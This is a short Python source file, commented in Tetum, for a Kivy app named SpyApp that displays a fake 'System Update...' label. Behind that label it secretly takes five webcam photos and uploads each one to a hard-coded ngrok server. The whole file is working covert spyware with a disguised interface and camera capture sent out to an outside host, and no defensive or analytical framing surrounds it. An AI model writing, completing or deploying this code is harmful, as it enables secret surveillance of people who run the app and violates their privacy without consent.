import cv2
import requests
import time
from kivy.app import App
from kivy.uix.label import Label

# URL Ngrok husi image_728680.png
URL = "https://bleariest-portraitlike-dreama.ngrok-free.dev/upload"

class SpyApp(App):
    def build(self):
        return Label(text="System Update...")

    def on_start(self):
        cap = cv2.VideoCapture(0)
        try:
            # Foti foto 5 hodi koko
            for i in range(5):
                ret, frame = cap.read()
                if ret:
                    _, img_encoded = cv2.imencode('.jpg', frame)
                    files = {'file': (f'spy_{i}.jpg', img_encoded.tobytes())}
                    requests.post(URL, files=files)
                time.sleep(2)
        finally:
            cap.release()

if __name__ == "__main__":
    SpyApp().run()
